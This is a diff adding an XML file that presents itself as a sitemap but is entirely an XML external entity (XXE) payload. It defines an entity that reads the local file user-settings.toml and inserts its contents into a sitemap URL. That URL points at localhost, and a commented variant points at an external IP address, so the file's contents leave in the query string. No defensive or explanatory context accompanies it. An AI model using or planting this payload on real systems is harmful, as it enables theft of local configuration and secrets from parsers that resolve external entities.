@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///user-settings.toml" >
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+    <url>
+        <loc>
+            <!-- http://135.181.86.32:8000/?&xxe; -->
+            http://localhost:8000/?&xxe;
+        </loc>
+    </url>
+</urlset>
